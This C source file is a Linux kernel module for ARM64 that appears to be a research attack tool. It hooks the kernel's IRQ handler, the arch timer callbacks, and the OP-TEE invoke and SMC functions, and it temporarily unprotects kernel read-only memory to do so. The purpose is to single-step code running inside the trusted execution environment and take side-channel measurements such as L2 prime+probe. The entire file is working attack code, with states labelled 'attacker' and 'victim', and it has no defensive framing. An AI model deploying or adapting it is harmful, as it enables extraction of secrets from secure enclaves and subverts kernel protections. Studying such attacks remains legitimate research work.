#include "kern_hijack.h"
#include "Load_Step.h"

// [IRQ_Handler]pointers to be searched by kallsyms
static void (*handle_arch_irq_p)(struct pt_regs *);
static void (*update_mapping_prot_p)(phys_addr_t phys, unsigned long virt, phys_addr_t size, pgprot_t prot);
static void* __init_begin_p;
static void* __start_rodata_p;
static void (*arch_send_call_function_single_ipi_p)(int cpu);

static void (*original_gic_handler)(struct pt_regs *);
static void load_step_gic_handle_irq(struct pt_regs *regs);

void IRQ_Handler_Hijack_Init(void)
{
    // search all pointers needed
    handle_arch_irq_p = (void*) kallsyms_lookup_name("handle_arch_irq");
    update_mapping_prot_p = (void*) kallsyms_lookup_name("update_mapping_prot");
    __init_begin_p = (void*) kallsyms_lookup_name("__init_begin");
    __start_rodata_p = (void*) kallsyms_lookup_name("__start_rodata");
	// printk("read_only memory is from 0x%x to 0x%x \n", __start_rodata_p, __init_begin_p);
    arch_send_call_function_single_ipi_p = (void*) kallsyms_lookup_name("arch_send_call_function_single_ipi");

    original_gic_handler = *(unsigned long*)handle_arch_irq_p;

    update_mapping_prot_p(__pa_symbol(__start_rodata_p), (unsigned long)__start_rodata_p, (unsigned long)__init_begin_p - (unsigned long)__start_rodata_p, PAGE_KERNEL);

    *(unsigned long*)handle_arch_irq_p = load_step_gic_handle_irq;

    update_mapping_prot_p(__pa_symbol(__start_rodata_p), (unsigned long)__start_rodata_p, (unsigned long)__init_begin_p - (unsigned long)__start_rodata_p, PAGE_KERNEL_RO);

    // printk("Redirect handle_arch_irq (va: 0x%x) from 0x%x to 0x%x\n", handle_arch_irq_p, original_gic_handler, *(unsigned long*)handle_arch_irq_p);
}

void IRQ_Handler_Hijack_Free(void)
{
    update_mapping_prot_p(__pa_symbol(__start_rodata_p), (unsigned long)__start_rodata_p, (unsigned long)__init_begin_p - (unsigned long)__start_rodata_p, PAGE_KERNEL);

    *(unsigned long*)handle_arch_irq_p = original_gic_handler;

    update_mapping_prot_p(__pa_symbol(__start_rodata_p), (unsigned long)__start_rodata_p, (unsigned long)__init_begin_p - (unsigned long)__start_rodata_p, PAGE_KERNEL_RO);
}


/*
	-2: dead
	-1: ready
	 0: owned by the attacker
	 1: owned by the victim
*/
int load_step_state_machine = -2;
bool load_step_gic_lock  = false;
unsigned int load_step_irq_counts = 0;

// new gic_irq_handler
static void load_step_gic_handle_irq(struct pt_regs *regs)
{
	int load_step_target_core = smp_processor_id();

	if(load_step_state_machine != -2)
	{
		if(load_step_target_core == VIM_CORE)
		{
			if(load_step_state_machine == 1)
			{
				load_step_state_machine = 0;
				load_step_detect(load_step_detect_buffer);
				//stop measure precisely when epoch reaches the limitation
				load_step_irq_counts++;
				if(load_step_irq_counts>IRQ_LIMIT)
				{
#ifndef SOFT_TIMER
					load_step_irq_interval = 250;
#elif SOFT_TIMER == 1 //pmccntr_el0
					load_step_irq_interval = 200000;
#elif SOFT_TIMER == 2 //count-down
					load_step_irq_interval = 1000000;
#endif
				}
			}
			load_step_gic_lock = false;
		}
#ifndef SOFT_TIMER
		else if(load_step_target_core == AUX_CORE)
		{
			load_step_gic_lock = true;
			arch_send_call_function_single_ipi_p(VIM_CORE);
			do
			{
				asm volatile ("nop");
			} while (load_step_gic_lock);
		}
#endif
	}

    original_gic_handler(regs);
}

#ifndef SOFT_TIMER
// [Arch_Timer]pointers to be searched by kallsyms
static struct irq_desc* (*irq_to_desc_p)(unsigned int irq);
static struct tick_device __percpu *tick_cpu_device_p;

static irqreturn_t (*original_arch_timer_handler_phys)(int irq, void *dev_id);
static int (*original_arch_timer_shutdown_phys)(struct clock_event_device *clk);
static int (*original_arch_timer_set_next_event_phys)(unsigned long evt, struct clock_event_device *clk);
static irqreturn_t load_step_arch_timer_handler_phys(int irq, void *dev_id);
static int load_step_arch_timer_shutdown_phys(struct clock_event_device *clk);
static int load_step_arch_timer_set_next_event_phys(unsigned long evt, struct clock_event_device *clk);
static struct irqaction *action;
static struct clock_event_device *dev;


void Arch_Timer_Hijack_Init(void)
{
    //search all pointers needed
    irq_to_desc_p = (void*) kallsyms_lookup_name("irq_to_desc");
	tick_cpu_device_p = (void*) kallsyms_lookup_name("tick_cpu_device");

    struct irq_desc *desc = irq_to_desc_p(3); // irq 3 is hwirq 30, the arm_arch_timer

    action = desc->action;
	original_arch_timer_handler_phys = action->handler;
	action->handler = load_step_arch_timer_handler_phys;

    struct tick_device *tick_cpu_device_p_this_cpu = per_cpu_ptr(tick_cpu_device_p, AUX_CORE);
    dev = tick_cpu_device_p_this_cpu->evtdev;

	original_arch_timer_shutdown_phys = dev->set_state_shutdown;
	dev->set_state_shutdown = load_step_arch_timer_shutdown_phys;
	dev->set_state_oneshot_stopped = load_step_arch_timer_shutdown_phys;

	original_arch_timer_set_next_event_phys = dev->set_next_event;
	dev->set_next_event = load_step_arch_timer_set_next_event_phys;
}

void Arch_Timer_Hijack_Free(void)
{
	action->handler = original_arch_timer_handler_phys;

	dev->set_state_shutdown = original_arch_timer_shutdown_phys;
	dev->set_state_oneshot_stopped = original_arch_timer_shutdown_phys;
	dev->set_next_event = original_arch_timer_set_next_event_phys;
}

// new arch_timer_handler_phys function
static irqreturn_t load_step_arch_timer_handler_phys(int irq, void *dev_id)
{
	struct clock_event_device *evt = dev_id;
	int load_step_target_core = smp_processor_id();

	if(load_step_target_core != AUX_CORE || load_step_state_machine == -2)
	{
		return original_arch_timer_handler_phys(irq, dev_id);
	}
	else
	{
		unsigned long ctrl;
		asm volatile("mrs %0, cntp_ctl_el0" : "=r" (ctrl));
		asm volatile ("isb");
		// ctrl = arch_timer_reg_read(ARCH_TIMER_PHYS_ACCESS, ARCH_TIMER_REG_CTRL, evt);
		if (ctrl & ARCH_TIMER_CTRL_IT_STAT) 
		{
			ctrl |= ARCH_TIMER_CTRL_IT_MASK;
			// arch_timer_reg_write(ARCH_TIMER_PHYS_ACCESS, ARCH_TIMER_REG_CTRL, ctrl, evt);
			asm volatile("msr cntp_ctl_el0, %0" : : "r" (ctrl));
			asm volatile ("isb");
			// ctrl = arch_timer_reg_read(ARCH_TIMER_PHYS_ACCESS, ARCH_TIMER_REG_CTRL, evt);
			asm volatile("mrs %0, cntp_ctl_el0" : "=r" (ctrl));
			asm volatile ("isb");
			ctrl |= ARCH_TIMER_CTRL_ENABLE;
			ctrl &= ~ARCH_TIMER_CTRL_IT_MASK;

			do
			{
				asm volatile ("nop");
			} while (load_step_state_machine == 0);

			// arch_timer_reg_write(ARCH_TIMER_PHYS_ACCESS, ARCH_TIMER_REG_TVAL, load_step_irq_interval, evt);
			asm volatile("msr cntp_tval_el0, %0" : : "r" (load_step_irq_interval));
			// arch_timer_reg_write(ARCH_TIMER_PHYS_ACCESS, ARCH_TIMER_REG_CTRL, ctrl, evt);
			asm volatile("msr cntp_ctl_el0, %0" : : "r" (ctrl));
			// set_next_event(ARCH_TIMER_PHYS_ACCESS, load_step_irq_interval, evt);
			return IRQ_HANDLED;
		}
		return IRQ_NONE;
	}
}

// new arch_timer_shutdown_phys
static int load_step_arch_timer_shutdown_phys(struct clock_event_device *clk)
{
	int load_step_target_core = smp_processor_id();

	if(load_step_target_core != AUX_CORE || load_step_state_machine == -2)
	{
		return original_arch_timer_shutdown_phys(clk);;
	}
	else
	{
		return 0;
	}	
}

// new arch_timer_set_next_event_phys
static int load_step_arch_timer_set_next_event_phys(unsigned long evt, struct clock_event_device *clk)
{
	int load_step_target_core = smp_processor_id();

	if(load_step_target_core != AUX_CORE || load_step_state_machine == -2)
	{
		original_arch_timer_set_next_event_phys(evt, clk);
		return 0;
	}
	else
	{
		return 0;
	}
}

#elif SOFT_TIMER == 1 //pmccntr_el0

void pmccntr_irq(void* data)
{
	unsigned long cycle_start, cycle_temp;

	do
	{
		asm volatile ("nop");

		//wait for preparation
		do
		{
			asm volatile ("nop");
		} while (load_step_state_machine == 0);
		asm volatile ("dsb sy");
		asm volatile ("isb");

		//set time interval START
		asm volatile("mrs %0, pmccntr_el0" : "=r"(cycle_start));
		cycle_start = cycle_start + load_step_irq_interval;
		asm volatile ("dsb sy");
		asm volatile ("isb");
		do
		{
			// asm volatile ("nop");
			asm volatile("mrs %0, pmccntr_el0" : "=r"(cycle_temp));
			asm volatile ("dsb sy");
			asm volatile ("isb");
			if (cycle_temp > cycle_start)
				break;
		} while (1);
		//set time interval END

		//invoke a cross core irq to vim_core
		arch_send_call_function_single_ipi_p(VIM_CORE);

		if(load_step_state_machine == -2)
		{
			break;
		}
		else // wait for its detection
		{
			load_step_gic_lock = true;
			do
			{
				asm volatile ("nop");
			} while (load_step_gic_lock);
		}
		
	} while (1);
}

#elif SOFT_TIMER == 2 //count-down

void cnt_down_irq(void* data)
{
	unsigned long cnt_down;

	do
	{
		asm volatile ("nop");

		cnt_down = load_step_irq_interval;
		//wait for preparation
		do
		{
			asm volatile ("nop");
		} while (load_step_state_machine == 0);
		asm volatile ("dsb sy");
		asm volatile ("isb");

		//set time interval START
		do
		{
			cnt_down--;
			asm("");
			// asm volatile ("nop");
		} while (cnt_down);
		//set time interval END

		//invoke a cross core irq to vim_core
		arch_send_call_function_single_ipi_p(VIM_CORE);

		if(load_step_state_machine == -2)
		{
			break;
		}
		else // wait for its detection
		{
			load_step_gic_lock = true;
			do
			{
				asm volatile ("nop");
			} while (load_step_gic_lock);
		}
		
	} while (1);
}

#endif

// [TEE_Invoke]pointers to be searched by kallsyms
static struct tee_driver_ops *optee_ops_p;
static int (*original_optee_invoke_func)(struct tee_context *ctx, struct tee_ioctl_invoke_arg *arg, struct tee_param *param);
static void (*original_optee_smccc_smc)(unsigned long a0, unsigned long a1, unsigned long a2, unsigned long a3, unsigned long a4, unsigned long a5, unsigned long a6, unsigned long a7, struct arm_smccc_res *res);
static int load_step_optee_invoke_func(struct tee_context *ctx, struct tee_ioctl_invoke_arg *arg, struct tee_param *param);
static void load_step_optee_smccc_smc(unsigned long a0, unsigned long a1, unsigned long a2, unsigned long a3, unsigned long a4, unsigned long a5, unsigned long a6, unsigned long a7, struct arm_smccc_res *res);

static void* (*tee_get_drvdata_p)(struct tee_device *teedev);

void TEE_Invoke_Hijack_Init(void)
{
    //search all pointers needed
    optee_ops_p = (void*) kallsyms_lookup_name("optee_ops");

	tee_get_drvdata_p = (void*) kallsyms_lookup_name("tee_get_drvdata");

	original_optee_invoke_func = optee_ops_p->invoke_func;

    update_mapping_prot_p(__pa_symbol(__start_rodata_p), (unsigned long)__start_rodata_p, (unsigned long)__init_begin_p - (unsigned long)__start_rodata_p, PAGE_KERNEL);

	optee_ops_p->invoke_func = load_step_optee_invoke_func;

    update_mapping_prot_p(__pa_symbol(__start_rodata_p), (unsigned long)__start_rodata_p, (unsigned long)__init_begin_p - (unsigned long)__start_rodata_p, PAGE_KERNEL_RO);
}

void TEE_Invoke_Hijack_Free(void)
{
    update_mapping_prot_p(__pa_symbol(__start_rodata_p), (unsigned long)__start_rodata_p, (unsigned long)__init_begin_p - (unsigned long)__start_rodata_p, PAGE_KERNEL);

    optee_ops_p->invoke_func = original_optee_invoke_func;

    update_mapping_prot_p(__pa_symbol(__start_rodata_p), (unsigned long)__start_rodata_p, (unsigned long)__init_begin_p - (unsigned long)__start_rodata_p, PAGE_KERNEL_RO);
}

void awake_target_core_hijack(void* data)
{
	asm volatile("msr cntp_tval_el0, %0" : : "r" (100));
	asm volatile("msr cntp_ctl_el0, %0" : : "r" (1));
    asm volatile ("isb");
}

void idle_target_core_hijack(void* data)
{
	asm volatile("msr cntp_tval_el0, %0" : : "r" (1000000000));
	asm volatile("msr cntp_ctl_el0, %0" : : "r" (1));
    asm volatile ("isb");
}

void load_step_irq_start_hijack(void)
{
	asm volatile ("dsb sy");
	asm volatile ("isb");
	if (load_step_irq_interval != 0)
	{
		load_step_irq_counts = 0;
		load_step_state_machine = -1;
		asm volatile ("dsb sy");
		asm volatile ("isb");
    	smp_call_function_single(VIM_CORE, idle_target_core_hijack, NULL, true);
#ifndef SOFT_TIMER
        smp_call_function_single(AUX_CORE, awake_target_core_hijack, NULL, true);
#elif SOFT_TIMER == 1 //pmccntr_el0
		smp_call_function_single(AUX_CORE, idle_target_core_hijack, NULL, true);
		smp_call_function_single(AUX_CORE, pmccntr_irq, NULL, false);
#elif SOFT_TIMER == 2 //pmccntr_el0
		smp_call_function_single(AUX_CORE, idle_target_core_hijack, NULL, true);
		smp_call_function_single(AUX_CORE, cnt_down_irq, NULL, false);
#endif
	}
}

void load_step_irq_stop_hijack(void)
{
	asm volatile ("dsb sy");
	asm volatile ("isb");
	load_step_irq_counts = 0;
	load_step_state_machine = -2;
	smp_call_function_single(VIM_CORE, awake_target_core_hijack, NULL, true);
	smp_call_function_single(AUX_CORE, awake_target_core_hijack, NULL, true);
}

// new optee_invoke_func
static int load_step_optee_invoke_func(struct tee_context *ctx, struct tee_ioctl_invoke_arg *arg, struct tee_param *param)
{
	struct optee *optee_p = tee_get_drvdata_p(ctx->teedev);

	original_optee_smccc_smc = optee_p->invoke_fn;
	optee_p->invoke_fn = load_step_optee_smccc_smc;

	load_step_irq_start_hijack();
	int ret = original_optee_invoke_func(ctx, arg, param);
	load_step_irq_stop_hijack();

	optee_p->invoke_fn = original_optee_smccc_smc;

	return ret;
}

// new optee_smccc_smc
static void load_step_optee_smccc_smc(unsigned long a0, unsigned long a1, unsigned long a2, unsigned long a3, unsigned long a4, unsigned long a5, unsigned long a6, unsigned long a7, struct arm_smccc_res *res)
{
	if(load_step_state_machine == 0)
	{
		load_step_fill(NULL);
		asm volatile ("dsb sy");
        asm volatile ("isb");
		load_step_state_machine = 1;
		asm volatile ("dsb sy");
        asm volatile ("isb");
	}
	original_optee_smccc_smc(a0, a1, a2, a3, a4, a5, a6, a7, res);

	if (res->a0 == OPTEE_SMC_RETURN_ETHREAD_LIMIT) {
		/*
		 * do nothing
		*/
	} else if (OPTEE_SMC_RETURN_IS_RPC(res->a0)) {
		//start detect and wait
		if(load_step_state_machine == -1)
		{
			load_step_state_machine = 1;
		}
		if(OPTEE_SMC_RETURN_GET_RPC_FUNC(res->a0) == OPTEE_SMC_RPC_FUNC_FOREIGN_INTR)
		{
			switch(load_step_side_channel)
			{
				case L2_PP:
					load_step_detect_buffer += L2_NUM_SETS+1;
					break;
				// other side-channel attacks... 

				default:
					break;
			}
		}
	} else {
		load_step_state_machine = -2;
	}
}